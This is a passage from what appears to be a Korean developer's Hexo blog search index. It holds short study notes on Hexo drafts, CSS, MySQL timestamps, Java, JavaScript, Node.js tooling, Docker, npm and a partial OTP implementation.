복잡해지는데, 여기서 스크롤해가면서 작성중인 글을 힘들게 찾을 필요가 없다. 작성완료하는 법 포스팅이 끝나면 이제 _posts 디렉터리로 옮기면 된다. cmd123hexo publish [layout] [작성 완료한 포스트 파일명]hexo publish aws aws-공부 드래그 앤 드랍으로 직접 posts 폴더로 옮겨줄 수도 있는데 publish 명령을 사용하게 되면 layout을 지정할 수 있다. scaffolds 디렉터리에 만들어준 틀대로 front-matter가 바뀐다. layout은 생략하면 기본값으로 post가 적용된다. 로컬에서 테스트하기 아쉽게도 우리가 알고 있는 hexo server로는 draft가 노출되지 않는다. cmd1hexo server --draft 근데 --draft 옵션을 사용하면 source/_drafts 디렉터리에 있는 md파일도 렌더링되어 나타나게 된다.","link":"/2020/09/22/hexo%EC%97%90%EC%84%9C-%EC%B4%88%EC%95%88-%EC%9E%91%EC%84%B1%EC%A4%91-%EC%82%AC%EC%9A%A9%ED%95%98%EA%B8%B0/"},{"title":"hosted with ❤ by GitHub로 코드 표시하는 법","text":"Github Gist 전문 용어로 Gist 라고 하며, 코드 블럭을 순수 md로도 표현할 수 있는데 Gist로도 할 수 있다. 여기저기 여러 화면에서 중복되어서 씌여지는 코드가 있다. 그런데 코드에 오타가 나서 수정을 한다고하자. md로 작성했으면 복사 붙여넣기로 인해 일일이 다 수정해야한다. 그런데 gist로 작성했으면 그냥 gist에 들어가서 수정하면 다 반영이 된다! Code Snippet 내용이 되는 코드들을 코드 스니펫이라고 부른다!","link":"/2020/09/17/hosted-with-%E2%9D%A4-by-GitHub%EB%A1%9C-%EC%BD%94%EB%93%9C-%ED%91%9C%EC%8B%9C%ED%95%98%EB%8A%94-%EB%B2%95/"},{"title":"inline style vs !important","text":"!important 승 갑자기 인라인에서 정의한 스타일과 !important 중에 누가 더 강력한지 궁금해 졌다. 123h1 { color: red !important;} index.html123456789101112&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot; /&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt; &lt;title&gt;Document&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot; /&gt; &lt;/head&gt; &lt;body&gt; &lt;h1 style=&quot;color: blue&quot;&gt;hello world&lt;/h1&gt; &lt;/body&gt;&lt;/html&gt;","link":"/2020/11/09/inline-style-vs-important/"},{"title":"input:number 화살표 없애기","text":"number type 일 때, 기본으로 화살표가 나온다. 이거를 없애보자 example.css1234input::-webkit-outer-spin-button,input::-webkit-inner-spin-button { -webkit-appearance: none;} 참고 https://www.w3schools.com/howto/howto_css_hide_arrow_number.asp","link":"/2020/12/15/input-number-%ED%99%94%EC%82%B4%ED%91%9C-%EC%97%86%EC%95%A0%EA%B8%B0/"},{"title":"input spellcheck off, input 빨간줄 없애기","text":"example.tsx12345678&lt;input ref={inputRef} type=&quot;text&quot; value={shareLink} onClick={onLinkClickHandler} spellCheck={false} readOnly/&gt; example.html1&lt;input type=&quot;text&quot; spellcheck=&quot;false&quot; /&gt; input안의 빨간 줄 생기는 것을 없앨 수 있다.","link":"/2020/12/22/input-spellcheck-off/"},{"title":"insert, update시 자동갱신 TIMESTAMP","text":"123456789CREATE TABLE LOG( `idx` INT NOT NULL AUTO_INCREMENT, `ip` VARCHAR(45) NOT NULL, `method` VARCHAR(45) NOT NULL, `url` VARCHAR(45) NOT NULL, `date` TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP, PRIMARY KEY (idx)); CURRENT_TIMESTAMP은 현재 시간을 의미한다. DEFAULT CURRENT_TIMESTAMP ; insert 시 자동으로 현재 시간이 들어간다 ON UPDATE CURRENT_TIMESTAMP ; update 시 자동으로 현재 시간으로 갱신된다. 이미 만든 칼럼에 적용하기123ALTER TABLE LOGMODIFY `date` datetime DEFAULT CURRENT_TIMESTAMP 참고 https://dev.mysql.com/doc/refman/8.0/en/timestamp-initialization.html","link":"/2020/11/11/insert-update%EC%8B%9C-%EC%9E%90%EB%8F%99%EA%B0%B1%EC%8B%A0-timestamp/"},{"title":"java memory 무한 증가.. 가비지 컬렉터 호출로 해결하기","text":"App.java12345678pathname = null;robot = null;screencapture = null;file = null;str = null;p = null;d = null;System.gc(); 내가 원할 때 가비지 컬렉터를 호출할 수 있다. System.gc(); 상황 java.awt.Robot 으로 스크린샷을 찍고 이미지 파일로 저장하는 로직이 있었다. 이거를 runnable jar로 익스포트하고 실행해사 잘 사용하고 있었는데 스크린샷을 찍는 함수가 실행될 때마다 메모리가 20mb 씩 증가했다… 함수가 끝낼 때에 맞춰서 사용한 변수들을 전부다 null을 대입했는데도 해결되지 않았다. 해결 마지막에 가비지 컬렉션을 호출함으로써 메모리가 폭풍증가하지 않게되었다.","link":"/2020/10/06/java-memory/"},{"title":"java 카테고리 생성","text":"java 공부한 내용 올리기","link":"/2020/09/21/java-%EC%B9%B4%ED%85%8C%EA%B3%A0%EB%A6%AC-%EC%83%9D%EC%84%B1/"},{"title":"javadoc 만들고 github에서 보기","text":"코드따로 문서따로… 하지 않고 한번에 해결하기 또 만든 javadoc을 깃허브에서 보여주는법! 따라하기준비물 이클립스 시작 나는 이 영상보고 따라했다. 코드는 아무렇게나, 자바독 주석도 아무렇게나 원하는 대로 만들면된다. 자바독 주석으로! App.java1234567891011121314151617181920212223242526272829303132333435363738package application;/** * Date: 2020-09-22 * This is a simple application for adding two integers. * @author chin_ * @version 1.0 */public class App { /** * int value for first number */ public int a; /** * int value for second number */ public int b; /** * This method adds x and y and returns the int result. * @param x first int value * @param y second int value * @return returning int value result from x + y */ public int sum(int x, int y) { return x + y; } /**The main method of this application * @param args array of string arguments. */ public static void main(String[] args) { }} /** */ 이런식으로 만든다. 설명하고 싶은 변수나 메서드 선언부에 커서를 두고 alt + shift + j 하면 자바독 주석이 생긴다. 열심히 설명 적고.. 자바독을 생성한다. 자신의 jdk 폴더로 가서 javadoc.exe를 지정해주고, (이미 세팅되어 있으면 패스) javadoc문서가 나올 경로를 지정한다. 기본값으로 (프로젝트명)\\doc 이렇게 되어있을 텐데, (프로젝트명)\\docs로 수정한다. docs가 깃허브 페이지를 통해 문서를 보여줄때 경로 규격이다. 또 docs폴더는 프로젝트 루트에 존재해야한다. Finish를 눌러 완료하면 javadoc 문서가 완성된다. cmd1git init 이제 git init 한다 .gitignore123456789101112131415161718192021222324252627282930# Created by https://www.toptal.com/developers/gitignore/api/java# Edit at https://www.toptal.com/developers/gitignore?templates=java### Java #### Compiled class file*.class# Log file*.log# BlueJ files*.ctxt# Mobile Tools for Java (J2ME).mtj.tmp/# Package Files #*.jar*.war*.nar*.ear*.zip*.tar.gz*.rar# virtual machine crash logs, see http://www.java.com/en/download/help/error_hotspot.xmlhs_err_pid*# End of https://www.toptal.com/developers/gitignore/api/java 위 내용으로 .gitignore 파일을 추가한다. java 프로젝트용 .gitignore파일이다. 쉽게 .gitignore파일 만드는 곳 이제 깃허브 저장소로 올린다. 브라우저로 방금 만든 저장소 세팅에 들어간다. 브랜치를 마스터로 선택, /docs 선택 save 버튼 클릭 이렇게 설정하면 잠시후 깃허브에서 javadoc으로 만든 내 프로젝트 문서를 볼 수 있게된다. 너무 빨리 접속하면 GitHub Pages is temporarily down for maintenance. 메시지를 볼 수 있다. 여기까지 프로젝트 파일","link":"/2020/09/22/javadoc-%EB%A7%8C%EB%93%A4%EA%B3%A0-github%EC%97%90%EC%84%9C-%EB%B3%B4%EA%B8%B0/"},{"title":"js bind","text":"typescript 코드다 1234567891011121314151617interface myType { name: string; age: number;}const me: myType = { name: 'name', age: 99,};[1, 2, 3, 4, 5].forEach(function (this: myType, value, index) { console.log(this); console.log(value, index);}, me);// 0 1 { name: 'name', age: 11 }// 1 2 { name: 'name', age: 11 }// 2 3 { name: 'name', age: 11 } 1234567891011121314151617181920212223242526272829303132333435363738394041class MyClass { me: Person; constructor(person: Person) { this.me = person; } someFunction() { [1, 2, 3].forEach(function (value) { console.log(value, this); }); } someFunctionBindThis() { [1, 2, 3, 4].forEach(function (this: MyClass, value) { console.log(value, this); }, this); } someFunctionWithArrow() { [1, 2, 3].forEach((value) =&gt; { console.log(value, this); }); }}const myclass = new MyClass(me);myclass.someFunction();// 1 undefined// 2 undefined// 3 undefinedmyclass.someFunctionBindThis();// 1 MyClass { me: { name: 'name', age: 11 } }// 2 MyClass { me: { name: 'name', age: 11 } }// 3 MyClass { me: { name: 'name', age: 11 } }myclass.someFunctionWithArrow();// 1 MyClass { me: { name: 'name', age: 11 } }// 2 MyClass { me: { name: 'name', age: 11 } }// 3 MyClass { me: { name: 'name', age: 11 } } bind 함수를 배워보았다 bind를 배우면서 function과 arrow function 차이를 실감하게 되었다 arrow function은 this를 바인딩하지 않는다 고로 arrow function은 bind를 사용할 수 없다 이 함수 표현은 메서드 함수가 아닌 곳에 적합하다 참고 https://developer.mozilla.org/ko/docs/Web/JavaScript/Reference/Functions/Arrow_functions https://developer.mozilla.org/ko/docs/Web/JavaScript/Reference/Global_Objects/Function/bind https://velog.io/@modolee/javascript-function-vs-arrow-function https://stackoverflow.com/questions/33308121/can-you-bind-this-in-an-arrow-function","link":"/2021/01/19/js-bind/"},{"title":"js object access by index","text":"의미없는 변수이름들.. api를 사용하다보면 주기적으로? 변수명이 바뀌는 상황이 나온다. 카카오 맵 api 가 그러하다. 이렇게 직접 객체의 변수에 접근해서 사용하는 것은 바람직하지 않다고 한다. 그런데 객체의 값에 직접 접근하고 싶은경우가 있을 수 있다. 하지만 키의 이름은 주기적으로 바뀐다. 그래서 obj.key 이런식의 접근은 당장에는 가능하나, 언젠가는 동작하지 않는 코드가 된다. 키의 이름이 주기적으로 바뀌는 것을 무시하고 접근한다고 생각하니까 인덱스로 접근하는 방법을 알아보았다. access by indexaccess by index12345a = { la: 1, ma: 2 };Object.keys(a)[0]; // 'la'a.la; // == 1a[Object.keys(a)[0]]; // == a.la Object.keys(a)를 통해 key의 배열을 받을 수 있다. 이를 통해서 인덱스를 통한 접근이 가능해진다. 인덱스 부여 실험12345a = { ma: 2, la: 1 };Object.keys(a)[0]; // 'ma'a = { la: 1, ma: 2 };Object.keys(a)[0]; // 'la' 인덱스가 어떻게 부여되나 실험을 해보았는데, 직관적으로 왼쪽에서 오른쪽으로 번호가 매겨진다. 키의 알파벳이나, 그 안에 들어있는 값이나 일절 상관없다. 참고 가장 베스트는 api에서 제공하는 메서드를 잘 알고 활용하는 것이다. 지도의 getCenter(), getBounds() 출력변수는 왜 자꾸 변하나요!?!?!?!?!?!?","link":"/2020/11/24/js-object-access-by-index/"},{"title":"js 이진수 앞에 0넣기","text":"방법1 ; substr1234let N = 7;let padding = '00000000';let result = (padding + N.toString(2)).substr(-padding.length); “00000111” 2진수, 16진수 등 표현할 때 앞에 0을 추가해서 보여주고싶을 때가 있다. 8자리로 표현하고싶으면, padding 변수에 0으로 8자리를 채운다. padding 과 이진수를 더하고 substr로 뒤에서부터 8자리만큼 잘라주면된다. 방법2 ; padStart1234let N = 7;let padding = '00000000';let result = N.toString(2).padStart(8, '0'); 오후 3:25 2021-03-24 추가 훨씬 더 간단한 방법이 있었다. padStart() 첫 번째 인자로 자릿수를 지정하고, 두 번째 인자로 추가할 문자열을 입력한다. 만약에 첫 번째 인자보다 긴 문자열일 경우 아무 일도 일어나지 않는다. 비슷한 메서드로 padEnd() 가 있는데 이거는 패딩을 뒤에 추가한다. 참고 way-to-add-leading-zeroes-to-binary-string-in-javascript substr https://developer.mozilla.org/ko/docs/Web/JavaScript/Reference/Global_Objects/String/padStart","link":"/2020/11/17/js-%EC%9D%B4%EC%A7%84%EC%88%98-%EC%95%9E%EC%97%90-0%EB%84%A3%EA%B8%B0/"},{"title":"nodejs 파일 목록 출력하기","text":"printFileList.js123456const fs = require('fs');const dirPath = '.';fs.readdir(dirPath, (error, filelist) =&gt; { console.log(filelist);}); 은근히 자주 쓴다. dirPath 변수에 원하는 디렉터리의 경로를 적어주어 확인할 수 있다. 내가 활용한 곳 .dockerignore 파일을 추가했는데 동작할까? 궁금해서 람다 실행환경 디렉터리 구조 파악","link":"/2020/10/16/js%ED%8C%8C%EC%9D%BC%EB%AA%A9%EB%A1%9D/"},{"title":"keyboardevent.io","text":"keyboardevent.io 를 만들어보았다. 웹에 포커스를 두고 키를 입력하면 그대로 화면에 출력한다. 출력되는 정보는 keydown이벤트의 정보들이다. 키 이벤트 관련 로직 짤 때, 들어가서 키코드 확인하기 좋을 것 같다. 심심하면 업데이트할 것 히스토리 만들기 소스코드 keyboardevent.io/js/index.js","link":"/2020/11/25/keyboardevent-io/"},{"title":"keydown event preventDefault","text":"F1 key 를 누르면 자동으로 도움말창이 열린다. 이거를 안열리게 해보자. 123456window.addEventListener(&quot;keydown&quot;, function (e) { // F1 keyCode if (e.keyCode === 112) { e.preventDefault(); }}); 이렇게 F1 key 의 경우에만 반응하지 않도록 만들 수 있다. 123window.addEventListener(&quot;keydown&quot;, function (e) { e.preventDefault();}); 이렇게 F1 key 뿐만아니라 다른 모든 키의 기본 실행을 방지할 수 있다. 참고 How to disable F1 key?","link":"/2020/11/30/keydown-event-preventDefault/"},{"title":"li point remove","text":"default.css123li { list-style-type: none;} li의 앞에 붙는 . 을 없앨 수 있다.","link":"/2020/11/03/li-point-remove/"},{"title":"linux node app 백그라운드 실행","text":"1nohup npm start &amp; ec2에서 24시간 돌아가는 웹 앱을 돌릴일이 생겼다. 그런데 처음에 그냥 마지막에 &amp;만 붙여주면 되겠지 하고 npm start &amp; 명령을 치고 리모트를 종료했더니, 리모트를 종료하는 순간 앱 실행도 멈췄다. 왜 그런가 했더니 단순히 &amp;을 붙이고 실행한 프로세스는 터미널이 종료하면 같이 꺼진다고 한다. nohup 리눅스에서는 특별한 패키지 설치없이도 완전한? 백그라운드 실행을 가능하게해주는 명령이 있다. 12nohup npm start &amp;exit 이렇게 실행하고 exit을 눌러 나와주면 터미널이 자동으로 닫힌다. 하지만 앱은 계속해서 실행되고 있다. exit 은 nohup이랑 관계없고, 그냥 터미널을 종료하는 명령이다 nohup 명령 후 아무키나 누르면 다시 터미널을 사용할 수 있는 상태가 된다. 참고 https://jahong.tistory.com/entry/EC2-deploy-server-%ED%94%84%EB%A1%9C%EC%84%B8%EC%8A%A4%EB%A5%BC-%EB%B0%B1%EA%B7%B8%EB%9D%BC%EC%9A%B4%EB%93%9C%EC%97%90%EC%84%9C-%EC%8B%A4%ED%96%89%EC%8B%9C%ED%82%A4%EA%B8%B0","link":"/2020/10/30/linux-node-app-%EB%B0%B1%EA%B7%B8%EB%9D%BC%EC%9A%B4%EB%93%9C-%EC%8B%A4%ED%96%89/"},{"title":"리눅스 shutdown 명령어","text":"12345678// 지금종료sudo shutdown -h now// 재시작sudo shutdown -r now// 종료예약 취소sudo shutdown -c","link":"/2020/12/21/linux-shutdown-%EB%AA%85%EB%A0%B9%EC%96%B4/"},{"title":"md에서 주석있는 json 스니펫 표현하기","text":"json1234567```json&quot;scripts&quot;: { // ... &quot;format&quot;: &quot;prettier --write src/**/*.ts{,x}&quot;, &quot;lint&quot;: &quot;tsc --noEmit &amp;&amp; eslint src/**/*.ts{,x}&quot;}``` jsonc1234567```json&quot;scripts&quot;: { // ... &quot;format&quot;: &quot;prettier --write src/**/*.ts{,x}&quot;, &quot;lint&quot;: &quot;tsc --noEmit &amp;&amp; eslint src/**/*.ts{,x}&quot;}``` github repo의 md파일을 보면 json안의 주석이 빨간색으로 표시될 때.. json 대신 jsonc 를 사용하면된다. json with comments 라는 뜻이다.","link":"/2020/11/19/md%EC%97%90%EC%84%9C-%EC%A3%BC%EC%84%9D%EC%9E%88%EB%8A%94-json-%EC%8A%A4%EB%8B%88%ED%8E%AB-%ED%91%9C%ED%98%84%ED%95%98%EA%B8%B0/"},{"title":"Moment.js utc 사용하기","text":"12const date1 = moment().utc().format('YYYY-MM-DD HH:mm:ss');console.log(date1); utc() 메서드를 이용한다. 활용한 곳 rds는 기본적으로 utc를 사용한다 그래서 현재 지역 시간으로 포맷팅 된 값을 그대로 db에 넣으면 안 된다 rds의 시간대를 변경하거나, insert, update 할 때 잘 가공해서 쿼리를 해야 한다 참고 https://momentjs.com/docs/#/parsing/utc/ https://aws.amazon.com/ko/premiumsupport/knowledge-center/rds-change-time-zone/","link":"/2021/01/05/moment-js-utc-%EC%82%AC%EC%9A%A9%ED%95%98%EA%B8%B0/"},{"title":"mysql vs mysql2","text":"mysql2를 사용해보자 mysql2 노드 패키지 기존 mysql 패키지 보다 빠름 기존 mysql를 대체하는 것이 목표라고함 참고 sidorares/node-mysql2 Comparing mysql vs. mysql2 What is the difference between MySQL &amp; MySQL2 considering NodeJS","link":"/2020/11/10/mysql-vs-mysql2-/"},{"title":"net::ERR_UNKNOWN_URL_SCHEME webview","text":"원문 : [안드로이드] webview에서 intent호출 시 net::ERR_UNKNOWN_URL_SCHEME 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768//자바@Overridepublic boolean shouldOverrideUrlLoading(WebView view, String url) { if (url != null &amp;&amp; url.startsWith(&quot;intent://&quot;)) { try { Intent intent = Intent.parseUri(url, Intent.URI_INTENT_SCHEME); Intent existPackage = getPackageManager().getLaunchIntentForPackage(intent.getPackage()); if (existPackage != null) { startActivity(intent); } else { Intent marketIntent = new Intent(Intent.ACTION_VIEW); marketIntent.setData(Uri.parse(&quot;market://details?id=&quot; + intent.getPackage())); startActivity(marketIntent); } return true; } catch (Exception e) { e.printStackTrace(); } } else if (url != null &amp;&amp; url.startsWith(&quot;market://&quot;)) { try { Intent intent = Intent.parseUri(url, Intent.URI_INTENT_SCHEME); if (intent != null) { startActivity(intent); } return true; } catch (URISyntaxException e) { e.printStackTrace(); } } view.loadUrl(url); return false;}// 코틀린override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean { if (url != null &amp;&amp; url.startsWith(&quot;intent://&quot;)) { try { val intent = Intent.parseUri(url, Intent.URI_INTENT_SCHEME) val existPackage = packageManager.getLaunchIntentForPackage(intent.getPackage()!!) if (existPackage != null) { startActivity(intent) } else { val marketIntent = Intent(Intent.ACTION_VIEW) marketIntent.data = Uri.parse(&quot;market://details?id=&quot; + intent.getPackage()!!) startActivity(marketIntent) } return true } catch (e: Exception) { e.printStackTrace() } } else if (url != null &amp;&amp; url.startsWith(&quot;market://&quot;)) { try { val intent = Intent.parseUri(url, Intent.URI_INTENT_SCHEME) if (intent != null) { startActivity(intent) } return true } catch (e: URISyntaxException) { e.printStackTrace() } } view.loadUrl(url) return false}","link":"/2020/12/01/net-ERR-UNKNOWN-URL-SCHEME-webview/"},{"title":"no follow","text":"nofollow https://ko.wikipedia.org/wiki/Nofollow SEO 설정을 하면서 알게된 것이다. hexo-autonofollow 모듈을 설치해 외부 링크에 nofollow 속성을 넣어준다. 참고 ; 구글 서치 콘솔 가이드","link":"/2020/09/22/no-follow/"},{"title":"node-abi","text":"ABI (Application Binary Interface) 일렉트론js에서 iohook 설치할 때 사용해보았다. 참고 ABI Stability | Node.js 응용 프로그램 이진 인터페이스","link":"/2020/11/16/node-abi/"},{"title":"node inspect","text":"12345node --inspect app.jsnode --inspect-brk app.jsnodemon --inspect app.jsnodemon --inspect-brk app.js node app을 크롬 개발자 도구로 디버깅 할 수 있다. chrome://inspect/#devices --inspect-brk 옵션은 코드 시작전 멈추는 옵션이다. 참고 Debugging in 2017 with Node.js Node.js 8 inspector","link":"/2020/11/16/node-inspect/"},{"title":"nodejs __dirname","text":"index.js12log(`__dirname`, __dirname);log(`process.cwd()`, process.cwd()); C:\\git&gt;node tmp\\app-root\\index.js__dirname C:\\git\\tmp\\app-rootprocess.cwd() C:\\git __dirname은 현재 실행하는 파일의 절대경로이다. process.cwd()는 node명령을 호출한 작업디렉터리의 절대경로이다. app-root-pathindex.js123456const log = console.log;const app_root_path = require('app-root-path').path;log(`__dirname`, __dirname);log(`process.cwd()`, process.cwd());log(`app_root_path`, app_root_path); 프로젝트 루트를 찾아주는 패키지도 있다. 참고 Modules: CommonJS modules | Node.js Documentation app-root-path","link":"/2020/11/16/nodejs-dirname/"},{"title":"nodejs + socketio 로 만드는 채팅 앱, 카카오톡 클론코딩?","text":"Web Dev Simplified의 Build a Real Time Chat App With Node.js And Socket.io을 보고 따라만들기 nodejs에서 html과 socket.io로 간단하게 챗앱을 만드는 것을 따라해보았다. Web Dev Simplified 정말 심플하게 잘알려준다.. ㄷㄷ 따라 만들면서 행복했다. 따라만들고 카카오톡같은 css를 입히고, 디테일한 기능을 추가 해줬다. 추가한 기능 고유한 프로필 사진 생성(랜덤색 + 이니셜) 현재 채팅에 참가한 유저 목록 위젯 width값이 작아지면 유저 목록 위젯 숨김 width값이 작아지면 프로필 사진 영역 숨김 같은 사람이 연달아 올릴 때 프로필 사진 생략 같은 사람이 같은 시간에 연달아 올릴 때 가장 최근 메시지에만 시간표시 메시지는 plain text로 표시 소스코드 chat-app-nodejs-and-socketio","link":"/2020/11/03/nodejs-socketio-%EB%A1%9C-%EB%A7%8C%EB%93%9C%EB%8A%94-%EC%B1%84%ED%8C%85-%EC%95%B1/"},{"title":"nodejs web dockerizing","text":"기존에 만들었었던 Nodejs Express WEB 프로젝트를 도커라이징 해보았다. 얄팍한 코딩사전님의 가장 쉽게 배우는 도커를 보고 시도했다. 도커가 이런거구나 하고 느낀 순간이였다.. 마치 신세계… 이번 도커라이징을 통해서 내 프로젝트를 도커가 설치되어있는 다른컴퓨터에서 매우 쉽게 돌려볼 수 있다는걸 알게되었다. 기존 상태 설명디렉터리 구조12345678910111213141516.├── node_modules/├── web│ ├── bin│ │ └── www│ ├── public/│ ├── routes/│ ├── utils/│ ├── views/│ └── app.js├── .gitattributes├── .gitignore├── package-lock.json├── package.json├── README.md└── sqldump.sql 그냥 node express 서버와 db덤프 파일인 sqldump.sql 가 구분없이 한 디렉터리에 있었다. 벡엔드와 데이터베이스로 분리하기 backend, database 폴더를 만든다. backend폴더로 sqldump.sql와 깃허브, 프리티어 세팅 등을 제외한 99.9999%의 소스파일들을 이동한다 database폴더로 sqldump.sql을 이동 sqldump.sql 이동123database└── scripts └── sqldump.sql 이런식으로 node express 서버와 db를 분리할 수 있었다. Dockerfile 작성하기backendbackend/Dockerfile12345678FROM node:12.18.3WORKDIR /usr/src/appCOPY . .RUN npm iCMD [&quot;npm&quot;, &quot;start&quot;] 내가 로컬에서 사용하는 환경을 토대로 내 앱에 맞는 노드버전을 가져와서 /usr/src/app 라는 워크디렉터리에 backend 아래있는 모든 파일들을 복사해오고 RUN 명령어로 npm i로 종속성을 설치한다. 그리고 CMD 명령으로 backend 서버를 실행시킨다. databasedatabase/Dockerfile12345678FROM mariadb:10.5ENV MYSQL_USER mysql_userENV MYSQL_PASSWORD 1234ENV MYSQL_ROOT_PASSWORD 1234ENV MYSQL_DATABASE webtestCOPY ./scripts/ /docker-entrypoint-initdb.d/ 내가 로컬에서 사용했던 마리아디비 버전 그대로 가져왔다 데이터베이스 관련 환경변수들을 정의해주고 scripts 디렉터리에 있는 dump파일을 /docker-entrypoint-initdb.d/ 로 복사한다 /docker-entrypoint-initdb.d/ 는 데이터베이스를 생성할 때, 하위 sql을 가지고 데이터베이스를 초기화해준다. 후기 메모리 딸린다.. 처음에는 좋아서 이것저것 다 도커라이징할려고 했는데, 하다보니까 메모리가 딸려서 마우스가 뚝뚝 끊겼다… 참고 Nodejs Express WEB 가장 쉽게 배우는 도커","link":"/2020/11/12/nodejs-web-dockerizing/"},{"title":"nodejs 카테고리 생성","text":"nodejs 공부한 내용 올리기","link":"/2020/09/21/nodejs-%EC%B9%B4%ED%85%8C%EA%B3%A0%EB%A6%AC-%EC%83%9D%EC%84%B1/"},{"title":"nodemon 변화감지 디렉터리 지정","text":"cmd1nodemon --watch app app/server.js nodemon을 사용해서 코드수정마다 서버를 자동으로 재시작하는데, view와 관련한 코드를 수정할 때 서버가 재시작되는 것은 불필요하고, 세션이 날라가는 등 오히려 불편할 수 있다. nodemon이 모든 프로젝트 디렉터리가 아닌 특정 디렉터리의 변화를 감시하고 재시작되는 것을 알아보자 명령어terminal1nodemon ./bin/www 보통 이렇게 아무것도 없이 사용하면, 거의 모든 변화마다 서버가 재시작된다. terminal1nodemon --watch routes ./bin/www --watch routes watch옵션을 넣어줌으로써 해당 디렉터리에서 변화가 있으면 재시작하도록 할 수 있다. terminal1nodemon --watch routes --watch libs ./bin/www 이런식으로 나열할 수 있다. 기본적으로 디렉터리명을 적어야하며, 하위디렉터리는 자동으로 포함된다. 그런데 여러개의 디렉터리를 나열을 해야하면은 반대로 무시할 디렉터리를 설정하는게 빠를 수 있다. config file로 설정nodemon.json12345678910111213141516{ &quot;restartable&quot;: &quot;rs&quot;, &quot;ignore&quot;: [&quot;.git&quot;, &quot;node_modules/**/node_modules&quot;], &quot;verbose&quot;: true, &quot;execMap&quot;: { &quot;js&quot;: &quot;node --harmony&quot; }, &quot;events&quot;: { &quot;restart&quot;: &quot;osascript -e 'display notification \\&quot;App restarted due to:\\n'$FILENAME'\\&quot; with title \\&quot;nodemon\\&quot;'&quot; }, &quot;watch&quot;: [&quot;test/fixtures/&quot;, &quot;test/samples/&quot;], &quot;env&quot;: { &quot;NODE_ENV&quot;: &quot;development&quot; }, &quot;ext&quot;: &quot;js,json&quot;} nodemon.json이름으로 파일을 하나 만들고 커스텀할 수 있다. 무시할 디렉터리를 ignore 배열에 나열하면 된다. 참고 https://github.com/remy/nodemon#monitoring-multiple-directories https://github.com/remy/nodemon/blob/master/doc/sample-nodemon.md","link":"/2020/11/02/nodemon-%EB%B3%80%ED%99%94%EA%B0%90%EC%A7%80-%EB%94%94%EB%A0%89%ED%84%B0%EB%A6%AC-%EC%A7%80%EC%A0%95/"},{"title":"npm 명령어","text":"내가 쓰는 명령어1234567npm inpm i [패키지명]npm i [패키지명] -Dnpm i [패키지명] -gnpm startnpm run [script] 이렇게를 주로 쓴다. 짧게 쓰는 npm 명령어 npm i == npm install npm i -D == npm i --save-dev npm i -g == npm i --global npm install option -D ; 개발할때만 쓰이는 패키지를 설치할때 사용한다. 배포할때 포함되지 않는다. -g ; 패키지 전역 설치. hexo같은 cli에 바로 명령어를 치는 놈들을 보통 이렇게 설치한다. 참고 npm i [패키지명] -S 이렇게 --save옵션을 줘야만 package.json에 들어갔는데, npm5부터 기본값이라 안적어도 된다. npm scriptspackage.json1234567891011{ // ... &quot;scripts&quot;: { &quot;build&quot;: &quot;hexo generate&quot;, &quot;clean&quot;: &quot;hexo clean&quot;, &quot;deploy&quot;: &quot;hexo deploy&quot;, &quot;test&quot;: &quot;hexo server&quot;, &quot;start&quot;: &quot;hexo generate &amp; hexo deploy &amp; git add . &amp; git commit -m &quot; } // ...} 여기에 명령을 등록시켜놓고 npm run build 이런식으로 사용한다. 여기서 test, start 스크립트는 run을 생략하여 npm start, npm test 이런식으로 사용할 수 있다. 그 외에 stop, restart 를 run 없이 바로 사용할 수 있다.","link":"/2020/09/21/npm-%EB%AA%85%EB%A0%B9%EC%96%B4/"},{"title":"npm 패키지 unpublish","text":"1npm unpublish {패키지명} -f 내 패지키 디렉터리로 가서 위 명령을 실행 처음에 브라우저로 npm에 접속한다음에 패키지 &gt; 세팅 에 딜리트가 있는줄 알았는데, cli로 지워야 했다. 삭제 조건 72 시간 이내에 게시 된 패키지 새로 생성 된 패키지의 경우 npm Public Registry의 다른 패키지가 패키지에 종속되지 않는 한 게시 후 처음 72 시간 이내에 언제든지 게시를 취소 할 수 있습니다. 72 시간 이상 전에 게시 된 패키지 다른 패키지의 종속성이 아니여야한다. 지난주에 다운로드 횟수가 300 회 미만 단일 소유자 참고 Unpublishing packages from the registry npm Unpublish Policy","link":"/2020/11/12/npm-%ED%8C%A8%ED%82%A4%EC%A7%80-unpublish/"},{"title":"otp 구현하기","text":"갑자기 otp를 구현하고 싶어졌다 Unix Epoch Time (Unix Time) 구하기 Unix Epoch Time ; 1970년 1월 1일 00:00:00 협정 세계시(UTC) 부터의 경과 시간을 초로 환산하여 정수로 나타낸 것이다. js1new Date().getTime(); // unix time N 구하기js12const ts = 30; // 30초 간격으로 토큰을 생성할 것let N = Math.floor(new Date().getTime() / (ts * 1000)); unix time에서 토큰 생성간격 ts 만큼을 나누고 소수점은 버려서 N을 구한다. N 16진수 변환js1let N_hex = (&quot;000000000000000&quot; + N.toString(16)).substr(-16); // 16자리가 되도록 앞에 0 패딩추가 N을 16진수로 변환하는데 16자리가 되도록 처리 m 구하기 (시간 베이스 메세지 값)js1let m = Buffer.from(N_hex); N_hex를 byte array로 변환 K 생성하기 (K : 공유키)js12345const base32 = require(&quot;base32&quot;); // base32 모듈 임포트const random12 = `${Math.random() * Math.pow(10, 20)}`.substring(0, 12); // 12자리 랜덤숫자 생성const K = base32.encode(random12); 랜덤값으로부터 20자리의 공유키 K 구하기 base32 모듈 설치 Math.random()으로 생성한 랜덤값을 12자리 문자열로 변환하고 base32인코딩하면 20자리의 문자열을 얻을 수 있음. HMAC hash 얻기js123const crypto = require(&quot;crypto&quot;);let hmac_hash = crypto.createHmac(&quot;sha1&quot;, K).update(m).digest(&quot;hex&quot;); 내장 모듈 crypto 에서 hmac hash를 얻을 수 있다. OTP 생성js1234567891011121314151617const offset = parseInt(Number(`0x${hmac_hash[hmac_hash.length - 1]}`), 10);// offset으로부터 4개 바이트 변환const token_hex_4bytes = hmac_hash.substring(offset * 2, offset * 2 + 4 * 2);let toekn_hex = &quot;&quot;;toekn_hex += ( &quot;00&quot; + (Number(`0x${token_hex_4bytes.substring(0, 2)}`) &amp; 0x7f).toString(16)).substr(-2);for (let index = 2; index &lt; token_hex_4bytes.length; index += 2) { const element = 